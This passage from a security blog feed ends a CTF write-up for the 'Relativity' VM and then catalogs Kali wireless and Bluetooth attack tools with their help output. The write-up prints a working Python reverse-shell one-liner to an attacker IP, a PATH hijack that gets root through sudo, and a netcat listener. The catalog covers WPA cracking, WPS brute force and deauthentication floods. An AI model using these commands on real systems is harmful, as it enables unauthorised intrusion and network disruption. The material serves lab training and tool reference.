python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.80.130",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code>
I updated it with my host address and port, put it in a file named fortune, gave it permissions and updated  the  path to start looking in <em>/tmp/</em>:</p>

<p>``` plain</p>

<p>[jetta@Relativity ~]$ chmod 777 /tmp/fortune</p>

<p>[jetta@Relativity ~]$ export PATH=&ldquo;/tmp:$PATH&rdquo;</p>

<p>[jetta@Relativity ~]$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/jetta/.local/bin:/home/jetta/bin
```</p>

<p>On my machine I had netcat listen for connections:</p>

<p><code>plain
root@kali:~# nc -vnlp 5555
nc: listening on :: 5555 ...
nc: listening on 0.0.0.0 5555 ...
</code></p>

<p>And now I ran <code>auth_server</code> again:</p>

<p><code>plain
[jetta@Relativity ~]$ sudo /home/jetta/auth_server/auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)
</code></p>

<p>And on my netcat side:</p>

<p><code>plain
sh-4.2# whoami
whoami
root
sh-4.2# cat /root/flag.txt
cat /root/flag.txt
65afa0e5928b98f7ae283e16df2d43bf
</code></p>

<p>Was curious about the hash, ran it in an online decrypter, the result was <em>sagishahar</em>.</p>

<p>Markdown formatting was a pain in the ass for cowsay, so a slightly different fortune cookie format, but straight from the cow&rsquo;s mouth!</p>

<p><img class="center" src="/images/pentest/relativity/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;fortune cowsay&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Wireless Attacks]]></title>
    <link href="http://chousensha.github.io/blog/2015/04/20/kali-tools-catalog-wireless-attacks/"/>
    <updated>2015-04-20T09:31:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/04/20/kali-tools-catalog-wireless-attacks</id>
    <content type="html"><![CDATA[<h3>802.11 Wireless Tools</h3>

<p><strong>aircrack-ng</strong></p>

<p>aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program.
It can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part of the aircrack-ng  suite  determines
the  WEP key using two fundamental methods. The first method is via the
PTW approach (Pyshkin, Tews, Weinmann). The main advantage of  the  PTW
approach  is  that  very few data packets are required to crack the WEP
key. The second method is the FMS/KoreK method.  The  FMS/KoreK  method
incorporates  various  statistical  attacks to discover the WEP key and
uses these in combination with brute forcing.</p>

<!-- more -->


<p>Additionally, the program offers a dictionary  method  for  determining
the WEP key. For cracking WPA/WPA2 pre-shared keys, a wordlist (file or
stdin) or an airolib-ng has to be used.</p>

<p>``` plain
  Aircrack-ng 1.2 rc1 &ndash; &copy; 2006-2013 Thomas d'Otreppe
  <a href="http://www.aircrack-ng.org">http://www.aircrack-ng.org</a></p>

<p>  usage: aircrack-ng [options] &lt;.cap / .ivs file(s)></p>

<p>  Common options:</p>

<pre><code>  -a &lt;amode&gt; : force attack mode (1/WEP, 2/WPA-PSK)
  -e &lt;essid&gt; : target selection: network identifier
  -b &lt;bssid&gt; : target selection: access point's MAC
  -p &lt;nbcpu&gt; : # of CPU to use  (default: all CPUs)
  -q         : enable quiet mode (no status output)
  -C &lt;macs&gt;  : merge the given APs to a virtual one
  -l &lt;file&gt;  : write key to file
</code></pre>

<p>  Static WEP cracking options:</p>

<pre><code>  -c         : search alpha-numeric characters only
  -t         : search binary coded decimal chr only
  -h         : search the numeric key for Fritz!BOX
  -d &lt;mask&gt;  : use masking of the key (A1:XX:CF:YY)
  -m &lt;maddr&gt; : MAC address to filter usable packets
  -n &lt;nbits&gt; : WEP key length :  64/128/152/256/512
  -i &lt;index&gt; : WEP key index (1 to 4), default: any
  -f &lt;fudge&gt; : bruteforce fudge factor,  default: 2
  -k &lt;korek&gt; : disable one attack method  (1 to 17)
  -x or -x0  : disable bruteforce for last keybytes
  -x1        : last keybyte bruteforcing  (default)
  -x2        : enable last  2 keybytes bruteforcing
  -y         : experimental  single bruteforce mode
  -K         : use only old KoreK attacks (pre-PTW)
  -s         : show the key in ASCII while cracking
  -M &lt;num&gt;   : specify maximum number of IVs to use
  -D         : WEP decloak, skips broken keystreams
  -P &lt;num&gt;   : PTW debug:  1: disable Klein, 2: PTW
  -1         : run only 1 try to crack key with PTW
</code></pre>

<p>  WEP and WPA-PSK cracking options:</p>

<pre><code>  -w &lt;words&gt; : path to wordlist(s) filename(s)
</code></pre>

<p>  WPA-PSK options:</p>

<pre><code>  -E &lt;file&gt;  : create EWSA Project file v3
  -J &lt;file&gt;  : create Hashcat Capture file
  -S         : WPA cracking speed test
  -r &lt;DB&gt;    : path to airolib-ng database
               (Cannot be used with -w)
</code></pre>

<p>  Other options:</p>

<pre><code>  -u         : Displays # of CPUs &amp; MMX/SSE support
  --help     : Displays this usage screen
</code></pre>

<p>```</p>

<p><strong>asleap</strong></p>

<p>Actively recover LEAP/PPTP passwords</p>

<p><img class="center" src="/images/kali/wifi/asleap.png" title="&lsquo;asleap&rsquo; &lsquo;asleap&rsquo;" ></p>

<p><strong>bully</strong></p>

<p>Bully is a new implementation of the WPS brute force attack, written in C. It is conceptually identical to other programs, in that it exploits the (now well known) design flaw in the WPS specification. It has several advantages over the original reaver code. These include fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options. It runs on Linux, and was specifically developed to run on embedded Linux systems (OpenWrt, etc) regardless of architecture.</p>

<p>Bully provides several improvements in the detection and handling of anomalous scenarios. It has been tested against access points from numerous vendors, and with differing configurations, with much success.</p>

<p>``` plain
  usage: bully <options> interface</p>

<p>  Required arguments:</p>

<pre><code>  interface      : Wireless interface in monitor mode (root required)

  -b, --bssid macaddr    : MAC address of the target access point
</code></pre>

<p>   Or</p>

<pre><code>  -e, --essid string     : Extended SSID for the access point
</code></pre>

<p>  Optional arguments:</p>

<pre><code>  -c, --channel N[,N...] : Channel number of AP, or list to hop [b/g]
  -i, --index N          : Starting pin index (7 or 8 digits)  [Auto]
  -l, --lockwait N       : Seconds to wait if the AP locks WPS   [43]
  -o, --outfile file     : Output file for messages          [stdout]
  -p, --pin N            : Starting pin number (7 or 8 digits) [Auto]
  -s, --source macaddr   : Source (hardware) MAC address      [Probe]
  -v, --verbosity N      : Verbosity level 1-3, 1 is quietest     [3]
  -w, --workdir path     : Location of pin/session files  [~/.bully/]
  -5, --5ghz             : Hop on 5GHz a/n default channel list  [No]
  -B, --bruteforce       : Bruteforce the WPS pin checksum digit [No]
  -F, --force            : Force continue in spite of warnings   [No]
  -S, --sequential       : Sequential pins (do not randomize)    [No]
  -T, --test             : Test mode (do not inject any packets) [No]
</code></pre>

<p>  Advanced arguments:</p>

<pre><code>  -a, --acktime N        : Deprecated/ignored                  [Auto]
  -r, --retries N        : Resend packets N times when not acked  [2]
  -m, --m13time N        : Deprecated/ignored                  [Auto]
  -t, --timeout N        : Deprecated/ignored                  [Auto]
  -1, --pin1delay M,N    : Delay M seconds every Nth nack at M5 [0,1]
  -2, --pin2delay M,N    : Delay M seconds every Nth nack at M7 [5,1]
  -A, --noacks           : Disable ACK check for sent packets    [No]
  -C, --nocheck          : Skip CRC/FCS validation (performance) [No]
  -D, --detectlock       : Detect WPS lockouts unreported by AP  [No]
  -E, --eapfail          : EAP Failure terminate every exchange  [No]
  -L, --lockignore       : Ignore WPS locks reported by the AP   [No]
  -M, --m57nack          : M5/M7 timeouts treated as WSC_NACK's  [No]
  -N, --nofcs            : Packets don't contain the FCS field [Auto]
  -P, --probe            : Use probe request for nonbeaconing AP [No]
  -R, --radiotap         : Assume radiotap headers are present [Auto]
  -W, --windows7         : Masquerade as a Windows 7 registrar   [No]
  -Z, --suppress         : Suppress packet throttling algorithm  [No]
  -V, --version          : Print version info and exit
  -h, --help             : Display this help information
</code></pre>

<p>```</p>

<p><strong>cowpatty</strong></p>

<p>Implementation of an offline dictionary attack against WPA/WPA2 networks using PSK-based authentication (e.g. WPA-Personal). Many enterprise networks deploy PSK-based authentication mechanisms for WPA/WPA2 since it is much easier than establishing the necessary RADIUS, supplicant and certificate authority architecture needed for WPA-Enterprise authentication. Cowpatty can implement an accelerated attack if a precomputed PMK file is available for the SSID that is being assessed.</p>

<p><img class="center" src="/images/kali/wifi/cowpatty.png" title="&lsquo;cowpatty&rsquo; &lsquo;cowpatty&rsquo;" ></p>

<p><strong>eapmd5pass</strong></p>

<p>EAP-MD5 is a legacy authentication mechanism that does not provide sufficient protection for user authentication credentials. Users who authenticate using EAP-MD5 subject themselves to an offline dictionary attack vulnerability. This tool reads from a live network interface in monitor-mode, or from a stored libpcap capture file, and extracts the portions of the EAP-MD5 authentication exchange. Once the challenge and response portions have been collected from this exchange, eapmd5pass will mount an offline dictionary attack against the user’s password.</p>

<p><img class="center" src="/images/kali/wifi/eapmd5pass.png" title="&lsquo;eapmd5pass&rsquo; &lsquo;eapmd5pass&rsquo;" ></p>

<p><strong>fern-wifi-cracker</strong></p>

<p>Fern Wifi Cracker is a Wireless security auditing and attack software program written using the Python Programming Language and the Python Qt GUI library, the program is able to crack and recover WEP/WPA/WPS keys and also run other network based attacks on wireless or ethernet based networks.</p>

<p>Fern Wifi Cracker currently supports the following features:</p>

<ul>
<li><p>WEP Cracking with Fragmentation,Chop-Chop, Caffe-Latte, Hirte, ARP Request Replay or WPS attack</p></li>
<li><p>WPA/WPA2 Cracking with Dictionary or WPS based attacks</p></li>
<li><p>Automatic saving of key in database on successful crack</p></li>
<li><p>Automatic Access Point Attack System</p></li>
<li><p>Session Hijacking (Passive and Ethernet Modes)</p></li>
<li><p>Access Point MAC Address Geo Location Tracking</p></li>
<li><p>Internal MITM Engine</p></li>
<li><p>Bruteforce Attacks (HTTP,HTTPS,TELNET,FTP)</p></li>
<li><p>Update Support</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/fern-wifi-cracker.png" title="&lsquo;fern-wifi-cracker&rsquo; &lsquo;fern-wifi-cracker&rsquo;" ></p>

<p><strong>genkeys</strong></p>

<p>Generates lookup file for asleap</p>

<p>``` plain
genkeys 2.2 &ndash; generates lookup file for asleap. <a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#x6a;&#119;&#x72;&#x69;&#103;&#104;&#x74;&#x40;&#104;&#x61;&#x73;&#98;&#x6f;&#114;&#x67;&#46;&#99;&#111;&#109;">&#x6a;&#119;&#114;&#105;&#103;&#x68;&#x74;&#x40;&#x68;&#x61;&#x73;&#98;&#x6f;&#x72;&#103;&#46;&#x63;&#111;&#109;</a>
genkeys: Must supply -r -f and -n
Usage: genkeys [options]</p>

<pre><code>-r  Input dictionary file, one word per line
-f  Output pass+hash filename
-n  Output index filename
-h  Last 2 hash bytes to filter with (optional)
</code></pre>

<p>```</p>

<p><strong>genpmk</strong></p>

<p>WPA-PSK precomputation attack</p>

<p><img class="center" src="/images/kali/wifi/genpmk.png" title="&lsquo;genpmk&rsquo; &lsquo;genpmk&rsquo;" ></p>

<p><strong>giskismet</strong></p>

<p>GISKismet is a wireless recon visualization tool to represent data gathered using Kismet in a flexible manner. GISKismet stores the information in a database so that the user can generate graphs using SQL. GISKismet currently uses SQLite for the database and GoogleEarth / KML files for graphing.</p>

<p>``` plain
Usage: giskismet [Options]</p>

<p>Input File:</p>

<pre><code>   --csv &lt;csv-file&gt;             Parse the input from Kismet-devel CSV
</code></pre>

<p>   -x  &mdash;xml &lt;xml-file>             Parse the input from Kismet-newcore NETXML</p>

<p>Input Filters:</p>

<pre><code>   --bssid file | list          Filter based on BSSID     
   --essid file | list          Filter based on ESSID 
   --encryption file | list     Filter based on Encryption 
   --channel file | list        Filter based on Channel
</code></pre>

<p>file | list (list = comma separated lists(needs quotes)</p>

<p>Kismet-newcore Options:
   -a  &mdash;ap                         Insert only the APs</p>

<p>Query
   -q  &mdash;query [sql]                SQL query
   -m  &mdash;manual [csv]               CSV output of manual SQL query</p>

<p>   -o  &mdash;output [file]              Output filename
   -n  &mdash;name [str]                 Name of the KML layer</p>

<pre><code>   --desc [str]                 Description of the KML layer
</code></pre>

<p>General Options:</p>

<pre><code>   --ignore-gps                 Import data even when GPS fields are missing
   --database [file]            SQLite3 database name [default: wireless.dbl]
</code></pre>

<p>   -d  &mdash;debug [num]                Display debug information
   -s  &mdash;silent                     No output when adding APs
   -v  &mdash;version                    Display version
   -h  &mdash;help                       Display this information</p>

<p>Send Comments to Joshua &ldquo;Jabra&rdquo; Abraham ( <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#106;&#x61;&#x62;&#114;&#x61;&#x40;&#115;&#x70;&#x6c;&#x30;&#x69;&#116;&#46;&#111;&#114;&#x67;">&#x6a;&#x61;&#98;&#x72;&#x61;&#64;&#x73;&#x70;&#x6c;&#48;&#x69;&#x74;&#46;&#x6f;&#114;&#103;</a> )
```</p>

<p><strong>kismet</strong></p>

<p>Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system. Kismet will work with any wireless card which supports raw monitoring (rfmon) mode, and (with appropriate hardware) can sniff 802.11b, 802.11a, 802.11g, and 802.11n traffic. Kismet also supports plugins which allow sniffing other media such as DECT.</p>

<p>Kismet identifies networks by passively collecting packets and detecting standard named networks, detecting (and given time, decloaking) hidden networks, and infering the presence of nonbeaconing networks via data traffic.</p>

<p>Kismet supports logging to the wtapfile packet format (readable by tcpdump and ethereal) and saves detected network information as plaintext,
CSV, and XML.  kismet is capable of using any GPS supported by gpsd and
logs and plots network data.</p>

<p><img class="center" src="/images/kali/wifi/kismet.png" title="&lsquo;kismet&rsquo; &lsquo;kismet&rsquo;" ></p>

<p><strong>mdk3</strong></p>

<p>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.</p>

<p>``` plain
MDK 3.0 v6 &ndash; &ldquo;Yeah, well, whatever&rdquo;
by ASPj of k2wrlz, using the osdep library from aircrack-ng
And with lots of help from the great aircrack-ng community:
Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
THANK YOU!</p>

<p>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
IMPORTANT: It is your responsibility to make sure you have permission from the
network owner before running MDK against it.</p>

<p>This code is licenced under the GPLv2</p>

<p>MDK USAGE:
mdk3 <interface> &lt;test_mode> [test_options]</p>

<p>Try mdk3 &mdash;fullhelp for all test options
Try mdk3 &mdash;help &lt;test_mode> for info about one test only</p>

<p>TEST MODES:
b   &ndash; Beacon Flood Mode</p>

<pre><code>  Sends beacon frames to show fake APs at clients.
  This can sometimes crash network scanners and even drivers!
</code></pre>

<p>a   &ndash; Authentication DoS mode</p>

<pre><code>  Sends authentication frames to all APs found in range.
  Too much clients freeze or reset some APs.
</code></pre>

<p>p   &ndash; Basic probing and ESSID Bruteforce mode</p>

<pre><code>  Probes AP and check for answer, useful for checking if SSID has
  been correctly decloaked or if AP is in your adaptors sending range
  SSID Bruteforcing is also possible with this test mode.
</code></pre>

<p>d   &ndash; Deauthentication / Disassociation Amok Mode</p>

<pre><code>  Kicks everybody found from AP
</code></pre>

<p>m   &ndash; Michael shutdown exploitation (TKIP)</p>

<pre><code>  Cancels all traffic continuously
</code></pre>

<p>x   &ndash; 802.1X tests
w   &ndash; WIDS/WIPS Confusion</p>

<pre><code>  Confuse/Abuse Intrusion Detection and Prevention Systems
</code></pre>

<p>f   &ndash; MAC filter bruteforce mode</p>

<pre><code>  This test uses a list of known client MAC Adresses and tries to
  authenticate them to the given AP while dynamically changing
  its response timeout for best performance. It currently works only
  on APs who deny an open authentication request properly
</code></pre>

<p>g   &ndash; WPA Downgrade test</p>

<pre><code>  deauthenticates Stations and APs sending WPA encrypted packets.
  With this test you can check if the sysadmin will try setting his
  network to WEP or disable encryption.
</code></pre>

<p>```</p>

<p><strong>wifiarp</strong></p>

<p>Wifi injection ARP answering tool based on Wifitap</p>

<p><strong>wifidns</strong></p>

<p>Wifi injection DNS answering tool based on Wifitap</p>

<p>``` plain
root@kali:~# wifidns -h
Psyco optimizer not installed, running anyway&hellip;
INFO: did not find python gnuplot wrapper . Won&rsquo;t be able to plot
INFO: Can&rsquo;t open /etc/ethertypes file
Usage: wifidns -b <BSSID> -a <IP> [-o <iface>] [-i <iface>]</p>

<pre><code>                      [-s &lt;SMAC&gt;] [-t &lt;TTL&gt;] [-w &lt;WEP key&gt;]
                      [-k &lt;key id&gt;]] [-d [-v]] [-h]
 -b &lt;BSSID&gt;    specify BSSID for injection
 -a &lt;IP&gt;       specify IP address for DNS answers
 -t &lt;TTL&gt;      Set TTL (default: 64)
 -o &lt;iface&gt;    specify interface for injection (default: ath0)
 -i &lt;iface&gt;    specify interface for listening (default: ath0)
 -s &lt;SMAC&gt;     specify source MAC address for injected frames
 -w &lt;key&gt;      WEP mode and key
 -k &lt;key id&gt;   WEP key id (default: 0)
 -d            activate debug
 -v            verbose debugging
 -h            this so helpful output
</code></pre>

<p>```</p>

<p><strong>wifi-honey</strong></p>

<p>This script creates five monitor mode interfaces, four are used as APs and the fifth is used for airodump-ng. To make things easier, rather than having five windows all this is done in a screen session which allows you to switch between screens to see what is going on. All sessions are labelled so you know which is which.</p>

<p>``` plain
Usage: /usr/bin/wifi-honey <essid> <channel> <interface></p>

<p>Default channel is 1
Default interface is wlan0</p>

<p>Robin Wood <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#114;&#111;&#98;&#x69;&#x6e;&#x40;&#x64;&#105;&#103;&#105;&#x6e;&#x69;&#x6e;&#x6a;&#97;&#x2e;&#111;&#114;&#103;">&#x72;&#x6f;&#x62;&#105;&#x6e;&#64;&#100;&#105;&#103;&#x69;&#110;&#x69;&#x6e;&#106;&#97;&#46;&#x6f;&#x72;&#x67;</a>
See Security Tube Wifi Mega Primer episode 26 for more information
```</p>

<p><strong>wifiping</strong></p>

<p>Wifi injection based answering tool based on Wifitap</p>

<p><strong>wifitap</strong></p>

<p>Wifitap is a proof of concept for communication over WiFi networks using traffic injection.</p>

<p>Wifitap allows any application do send and receive IP packets using 802.11 traffic capture and injection over a WiFi network simply configuring wj0, which means :</p>

<ul>
<li><p>setting an IP address consistent with target network address range</p></li>
<li><p>routing desired traffic through it</p></li>
</ul>


<p>In particular, it’s a cheap method for arbitrary packets injection in 802.11 frames without specific library.</p>

<p>In addition, it will allow one to get rid of any limitation set at access point level, such as bypassing inter-client communications prevention systems (e.g. Cisco PSPF) or reaching multiple SSID handled by the same access point.</p>

<p><img class="center" src="/images/kali/wifi/wifitap.png" title="&lsquo;wifitap&rsquo; &lsquo;wifitap&rsquo;" ></p>

<p><strong>wifite</strong></p>

<p>An automated wireless attack tool. To attack multiple WEP, WPA, and WPS encrypted networks in a row. This tool is customizable to be automated with only a few arguments. Wifite aims to be the &ldquo;set it and forget it&rdquo; wireless auditing tool.</p>

<p>Features</p>

<ul>
<li><p>sorts targets by signal strength (in dB); cracks closest access points first</p></li>
<li><p>automatically de-authenticates clients of hidden networks to reveal SSIDs</p></li>
<li><p>numerous filters to specify exactly what to attack (wep/wpa/both, above certain signal strengths, channels, etc)</p></li>
<li><p>customizable settings (timeouts, packets/sec, etc)</p></li>
<li><p>&ldquo;anonymous&rdquo; feature; changes MAC to a random address before attacking, then changes back when attacks are complete</p></li>
<li><p>all captured WPA handshakes are backed up to wifite.py&rsquo;s current directory</p></li>
<li><p>smart WPA de-authentication; cycles between all clients and broadcast deauths</p></li>
<li><p>stop any attack with Ctrl+C, with options to continue, move onto next target, skip to cracking, or exit</p></li>
<li><p>displays session summary at exit; shows any cracked keys</p></li>
<li><p>all passwords saved to cracked.txt</p></li>
<li><p>built-in updater: ./wifite.py -upgrade</p></li>
</ul>


<p><code>`` plain
 .;'                    </code>;,  <br/>
 .;&lsquo;  ,;&rsquo;             <code>;, </code>;,   WiFite v2 (r85)
.;&lsquo;  ,;&rsquo;  ,;&lsquo;     <code>;, </code>;,  `;,<br/>
::   ::   :   ( )   :   ::   ::  automated wireless auditor
&rsquo;:.  &lsquo;:.  &rsquo;:. /<em>\ ,:&lsquo;  ,:&rsquo;  ,:&lsquo;<br/>
 &rsquo;:.  &lsquo;:.    /</em><strong>\    ,:&rsquo;  ,:&lsquo;   designed for Linux
  &rsquo;:.       /</strong>___\      ,:'</p>

<pre><code>       /       \             
</code></pre>

<p>   COMMANDS</p>

<pre><code>-check &lt;file&gt;   check capfile &lt;file&gt; for handshakes.
-cracked        display previously-cracked access points
</code></pre>

<p>   GLOBAL</p>

<pre><code>-all            attack all targets.              [off]
-i &lt;iface&gt;      wireless interface for capturing [auto]
-mac            anonymize mac address            [off]
-c &lt;channel&gt;    channel to scan for targets      [auto]
-e &lt;essid&gt;      target a specific access point by ssid (name)  [ask]
-b &lt;bssid&gt;      target a specific access point by bssid (mac)  [auto]
-showb          display target BSSIDs after scan               [off]
-pow &lt;db&gt;       attacks any targets with signal strenghth &gt; db [0]
-quiet          do not print list of APs during scan           [off]
</code></pre>

<p>   WPA</p>

<pre><code>-wpa            only target WPA networks (works with -wps -wep)   [off]
-wpat &lt;sec&gt;     time to wait for WPA attack to complete (seconds) [500]
-wpadt &lt;sec&gt;    time to wait between sending deauth packets (sec) [10]
-strip          strip handshake using tshark or pyrit             [off]
-crack &lt;dic&gt;    crack WPA handshakes using &lt;dic&gt; wordlist file    [off]
-dict &lt;file&gt;    specify dictionary to use when cracking WPA [phpbb.txt]
-aircrack       verify handshake using aircrack [on]
-pyrit          verify handshake using pyrit    [off]
-tshark         verify handshake using tshark   [on]
-cowpatty       verify handshake using cowpatty [off]
</code></pre>

<p>   WEP</p>

<pre><code>-wep            only target WEP networks [off]
-pps &lt;num&gt;      set the number of packets per second to inject [600]
-wept &lt;sec&gt;     sec to wait for each attack, 0 implies endless [600]
-chopchop       use chopchop attack      [on]
-arpreplay      use arpreplay attack     [on]
-fragment       use fragmentation attack [on]
-caffelatte     use caffe-latte attack   [on]
-p0841          use -p0841 attack        [on]
-hirte          use hirte (cfrag) attack [on]
-nofakeauth     stop attack if fake authentication fails    [off]
-wepca &lt;n&gt;      start cracking when number of ivs surpass n [10000]
-wepsave        save a copy of .cap files to this directory [off]
</code></pre>

<p>   WPS</p>

<pre><code>-wps        only target WPS networks         [off]
-wpst &lt;sec&gt;     max wait for new retry before giving up (0: never)  [660]
-wpsratio &lt;per&gt; min ratio of successful PIN attempts/total tries    [0]
-wpsretry &lt;num&gt; max number of retries for same PIN before giving up [0]
</code></pre>

<p>   EXAMPLE</p>

<pre><code>./wifite.py -wps -wep -c 6 -pps 600
</code></pre>

<p> [+] quitting
```</p>

<h3>Bluetooth Tools</h3>

<p><strong>bluelog</strong></p>

<p>Bluelog  is  a simple Bluetooth scanner that is designed to essentially
do just one thing, log all the discoverable devices in the area. It  is
intended  to  be  used as a site survey tool, identifying the number of
possible Bluetooth targets there are in the surrounding environment.</p>

<p>``` plain</p>

<h2>Bluelog (v1.1.2) by Tom Nardi &ldquo;MS3FGX&rdquo; (<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#77;&#83;&#51;&#x46;&#71;&#x58;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#109;">&#x4d;&#83;&#51;&#x46;&#71;&#88;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a>)</h2>

<p>Bluelog is a Bluetooth site survey tool, designed to tell you how
many discoverable devices there are in an area as quickly as possible.
As the name implies, its primary function is to log discovered devices
to file rather than to be used interactively. Bluelog could run on a
system unattended for long periods of time to collect data.</p>

<p>Bluelog also includes a mode called &ldquo;Bluelog Live&rdquo; which creates a
webpage of the results that you can serve up with your HTTP daemon of
choice. See the &ldquo;README.LIVE&rdquo; file for details.</p>

<p>For more information, see: www.digifail.com</p>

<p>Basic Options:</p>

<pre><code>-i &lt;interface&gt;     Sets scanning device, default is "hci0"
-o &lt;filename&gt;      Sets output filename, default is "devices.log"
-v                 Verbose, prints discovered devices to the terminal
-q                 Quiet, turns off nonessential terminal outout
-d                 Enables daemon mode, Bluelog will run in background
-k                 Kill an already running Bluelog process
-l                 Start "Bluelog Live", default is disabled
</code></pre>

<p>Logging Options:</p>

<pre><code>-n                 Write device names to log, default is disabled
-m                 Write device manufacturer to log, default is disabled
-c                 Write device class to log, default is disabled
-f                 Use "friendly" device class, default is disabled
-t                 Write timestamps to log, default is disabled
-x                 Obfuscate discovered MACs, default is disabled
-e                 Encode discovered MACs with CRC32, default disabled
-b                 Enable BlueProPro log format, see README
</code></pre>

<p>Advanced Options:</p>

<pre><code>-r &lt;retries&gt;       Name resolution retries, default is 3
-a &lt;minutes&gt;       Amnesia, Bluelog will forget device after given time
-w &lt;seconds&gt;       Scanning window in seconds, see README
-s                 Syslog only mode, no log file. Default is disabled
</code></pre>

<p>```</p>

<p><strong>bluemaho</strong></p>

<p>BlueMaho is GUI-shell (interface) for suite of tools for testing security of bluetooth devices. It is freeware, opensource, written on python, uses wxPyhon. It can be used for testing BT-devices for known vulnerabilities and major thing to do – testing to find unknown vulns. Also it can form nice statistics.</p>

<p>Features:</p>

<ul>
<li><p>scan for devices, show advanced info, SDP records, vendor etc</p></li>
<li><p>track devices – show where and how much times device was seen, its name changes</p></li>
<li><p>loop scan – it can scan all time, showing you online devices</p></li>
<li><p>alerts with sound if new device found</p></li>
<li><p>on_new_device – you can specify what command should it run when it founds new device</p></li>
<li><p>it can use separate dongles – one for scaning (loop scan) and one for running tools or exploits</p></li>
<li><p>send files</p></li>
<li><p>change name, class, mode, BD_ADDR of local HCI devices</p></li>
<li><p>save results in database</p></li>
<li><p>form nice statistics (uniq devices by day/hour, vendors, services etc)</p></li>
<li><p>test remote device for known vulnerabilities (see exploits for more details)</p></li>
<li><p>test remote device for unknown vulnerabilities (see tools for more details)</p></li>
<li><p>themes! you can customize it</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/bluemaho.png" title="&lsquo;bluemaho&rsquo; &lsquo;bluemaho&rsquo;" ></p>

<p><strong>blueranger</strong></p>

<p>BlueRanger is a simple Bash script which uses Link Quality to locate Bluetooth device radios. It sends l2cap (Bluetooth) pings to create a connection between Bluetooth interfaces, since most devices allow pings without any authentication or authorization. The higher the link quality, the closer the device (in theory).</p>

<p>Use a Bluetooth Class 1 adapter for long range location detection. Switch to a Class 3 adapter for more precise short range locating. The recision and accuracy depend on the build quality of the Bluetooth adapter, interference, and response from the remote device. Fluctuations may occur even when neither device is in motion.</p>

<p>``` plain
BlueRanger 1.0 by JP Dunning (.ronin)
&lt;www.hackfromacave.com>
&copy; 2009-2012 Shadow Cave LLC.</p>

<p>NAME</p>

<pre><code>blueranger
</code></pre>

<p>SYNOPSIS</p>

<pre><code>    blueranger.sh &lt;hciX&gt; &lt;bdaddr&gt;
</code></pre>

<p>DESCRIPTION</p>

<pre><code>&lt;hciX&gt;         Local interface
&lt;bdaddr&gt;       Remote Device Address
</code></pre>

<p>```</p>

<p><strong>bluesnarfer</strong></p>

<p>A Bluetooth bluesnarfing Utility.</p>

<p><img class="center" src="/images/kali/wifi/bluesnarfer.png" title="&lsquo;bluesnarfer&rsquo; &lsquo;bluesnarfer&rsquo;" ></p>

<p><strong>btscanner</strong></p>

<p>btscanner is a tool designed specifically to extract as  much  information  as  possible  from  a Bluetooth device without the requirement to
pair. A detailed information screen extracts HCI and  SDP  information,
and  maintains an open connection to monitor the RSSI and link quality.
btscanner is based on the BlueZ Bluetooth stack, which is included with
recent  Linux kernels, and the BlueZ toolset. btscanner also contains a
complete listing of the IEEE OUI numbers and class lookup tables. Using
the information gathered from these sources it is possible to make educated guesses as to the host device type.</p>

<p>``` plain
Usage: btscanner [options]
options</p>

<pre><code>--help  Display help
--cfg=&lt;file&gt;    Use &lt;file&gt; as the config file
--no-reset  Do not reset the Bluetooth adapter before scanning
</code></pre>

<p>```</p>

<p><strong>redfang</strong></p>

<p>RedFang is a small proof-of-concept application to find non discoverable Bluetooth devices. This is done by brute forcing the last six (6) bytes of the Bluetooth address of the device and doing a read_remote_name().</p>

<p><img class="center" src="/images/kali/wifi/redfang.png" title="&lsquo;redfang&rsquo; &lsquo;redfang&rsquo;" ></p>

<p><strong>spooftooph</strong></p>

<p>Spooftooph is designed to automate spoofing or cloning Bluetooth device information. Make a Bluetooth device hide in plain site.</p>

<p>Features:</p>

<ul>
<li><p>Clone and log Bluetooth device information</p></li>
<li><p>Generate a random new Bluetooth profile</p></li>
<li><p>Change Bluetooth profile every X seconds</p></li>
<li><p>Specify device information for Bluetooth interface</p></li>
<li><p>Select device to clone from scan log</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/spooftooph.png" title="&lsquo;spooftooph&rsquo; &lsquo;spooftooph&rsquo;" ></p>

<h3>Other Wireless Tools</h3>

<p><strong>zbassocflood</strong></p>

<p>Transmit a flood of associate requests to a target network.</p>

<p>``` plain
zbassocflood: Transmit a flood of associate requests to a target network.
<a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#106;&#119;&#x72;&#x69;&#103;&#x68;&#116;&#64;&#119;&#105;&#108;&#x6c;&#104;&#97;&#x63;&#107;&#102;&#111;&#114;&#x73;&#x75;&#115;&#104;&#105;&#x2e;&#x63;&#x6f;&#x6d;">&#106;&#x77;&#x72;&#105;&#x67;&#x68;&#x74;&#x40;&#119;&#x69;&#x6c;&#108;&#x68;&#97;&#x63;&#107;&#102;&#111;&#114;&#x73;&#117;&#115;&#104;&#x69;&#x2e;&#x63;&#x6f;&#109;</a></p>

